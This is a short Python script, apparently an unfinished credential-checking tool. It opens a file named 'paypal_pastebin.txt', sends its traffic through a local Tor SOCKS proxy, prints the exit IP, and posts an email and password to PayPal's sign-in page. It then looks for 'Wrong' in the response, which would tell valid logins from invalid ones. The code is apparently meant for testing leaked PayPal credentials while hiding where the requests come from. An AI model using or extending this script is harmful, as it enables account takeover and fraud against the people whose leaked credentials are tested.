import re
import urllib
import requests
import time
url = "https://www.paypal.com/signin"
headers = {"User-Agent":"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2228.0 Safari/537.36"}
file   = open("paypal_pastebin.txt","r")

proxies ={ "http":"127.0.0.1:9150", "https":"127.0.0.1:9150"}

login = "a"
senha = "b"
session = requests.Session()
session.proxies = {}
session.proxies['http'] = 'socks5h://localhost:9150'
session.proxies['https'] = 'socks5h://localhost:9150'
meu_ip = "https://www.monip.org/"
r = session.get(url=meu_ip,headers=headers)
ip_atual = re.findall(r"[0-9]?[0-9]?[0-9]\.[0-9]?[0-9]?[0-9]\.[0-9]?[0-9]?[0-9]\.[0-9]?[0-9]?[0-9]?", r.text)
print("MEU IP >>> "+ "".join(ip_atual))



r = session.post(url=url, data={"login_email": login,"login_password":senha, "Submit":"submit"})
re.findall("Wrong", r.text)
#print(r.text)
